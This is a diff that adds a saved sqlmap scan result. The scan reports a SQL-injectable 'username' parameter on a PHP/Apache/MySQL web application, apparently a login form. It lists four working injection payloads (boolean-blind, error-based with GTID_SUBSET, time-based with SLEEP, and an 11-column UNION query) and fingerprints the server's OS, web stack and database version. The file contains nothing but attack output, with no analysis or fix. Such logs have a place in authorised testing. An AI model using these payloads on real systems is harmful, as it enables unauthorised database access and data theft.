@@ -1,0 +1,22 @@
+sqlmap identified the following injection point(s) with a total of 219 HTTP(s) requests:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: Password=1&username=-2552' OR 2981=2981#
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: Password=1&username=1' AND GTID_SUBSET(CONCAT(0x71706b7671,(SELECT (ELT(4588=4588,1))),0x7170707a71),4588)-- rYhp
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: Password=1&username=1' AND (SELECT 5023 FROM (SELECT(SLEEP(5)))rqgF)-- XSUQ
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 11 columns
+    Payload: Password=1&username=1' UNION ALL SELECT 93,CONCAT(0x71706b7671,0x596d507a7476414f645a6f4165584c55744d466678686f554c727563586d676d6c4f4b4f434f6376,0x7170707a71),93,93,93,93,93,93,93,93,93#
+---
+web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
+web application technology: PHP, Apache 2.4.41
+back-end DBMS: MySQL >= 5.6
